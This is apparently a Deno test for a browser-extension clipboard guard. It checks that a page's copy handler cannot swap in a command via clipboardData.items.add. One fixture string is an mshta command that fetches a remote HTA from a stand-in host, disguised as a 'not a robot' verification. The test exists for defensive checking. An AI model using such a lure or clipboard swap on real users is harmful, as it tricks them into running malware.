// Nightly verify: a page copy handler writing a command with
// e.clipboardData.items.add(string, type) (DataTransferItemList.prototype.add)
// must be checked like DataTransfer.prototype.setData.
import "../src/settings/features.js";
import "../src/general/filter-options.js";
import "../src/threat/psl.js";
import "../src/general/never-block-captcha.js";
import "../src/threat/protected-hosts.js";
import "../src/threat/compile.js";
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";
function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };

const BAD = "mshta https://evil.test/v.hta # I am not a robot - Verification ID: 4821";

function fakePage(host) {
  const listeners = {};
  const notices = [];
  let selection = "";
  let t = 1000;
  // Like Chrome: DataTransfer.items is a DataTransferItemList whose add(data, type)
  // stores a string item that ends up on the clipboard like setData does.
  class DataTransferItemList {
    constructor(dt) { this.dt = dt; }
    add(data, type) { if (typeof data === "string") { this.dt.data[String(type).toLowerCase()] = data; return { kind: "string", type }; } return null; }
  }
  class DataTransfer {
    constructor() { this.data = {}; }
    // Like Chromium: a new DataTransferItemList object on every read.
    get items() { return new DataTransferItemList(this); }
    setData(k, v) { this.data[k] = v; }
  }
  class Selection { toString() { return selection; } }
  class Document {}
  const document = new Document();
  document.addEventListener = (type, f) => { (listeners[type] ||= []).push(f); };
  document.activeElement = null;
  const window = { getSelection: () => new Selection(), Selection, DataTransfer, DataTransferItemList, Document };
  const g = loadClip();
  g.install({ window, document, navigator: {}, location: { hostname: host }, now: () => t, notify: (id) => notices.push(id), flagOn: () => true });
  return {
    notices, window,
    select: (s) => { selection = s; },
    tick: (ms) => { t += ms; },
    input: (type, e) => { const ev = Object.assign({ isTrusted: true, prevented: false, preventDefault() { this.prevented = true; } }, e); for (const f of listeners[type] || []) f(ev); return ev; },
  };
}

Deno.test("copy handler cannot swap in a command through clipboardData.items.add", () => {
  const p = fakePage("captcha-check.example");
  // Sanity: the setData path is guarded in this harness.
  p.select("Verification ID: 4821");
  p.input("keydown", { key: "c", ctrlKey: true, code: "KeyC" });
  p.tick(50);
  const dt0 = new p.window.DataTransfer();
  const ev0 = p.input("copy", { clipboardData: dt0 });
  // Since 0.3.6 (review 2026-11-16 WP-02) the guard cancels the browser's own
  // copy and writes the checked selection itself.
  assert(!ev0.prevented || dt0.data["text/plain"] === "Verification ID: 4821", "own copy of harmless selection goes through");
  dt0.setData("text/plain", BAD);
  assert(dt0.data["text/plain"] !== BAD, "setData path is guarded (harness sanity)");
  const noticesBefore = p.notices.length;

  // The visitor copies a harmless selection; the page's copy listener then
  // writes the command via items.add and calls preventDefault.
  p.select("Verification ID: 4821");
  p.input("keydown", { key: "c", ctrlKey: true, code: "KeyC" });
  p.tick(50);
  const dt = new p.window.DataTransfer();
  const ev = p.input("copy", { clipboardData: dt });
  assert(!ev.prevented || dt.data["text/plain"] === "Verification ID: 4821", "own copy of harmless selection goes through");
  dt.items.add(BAD, "text/plain");
  ev.preventDefault();
  assert(dt.data["text/plain"] !== BAD, "items.add put a command on the clipboard: " + JSON.stringify(dt.data));
  assert(p.notices.length > noticesBefore, "a notice is shown for the items.add attempt");
});
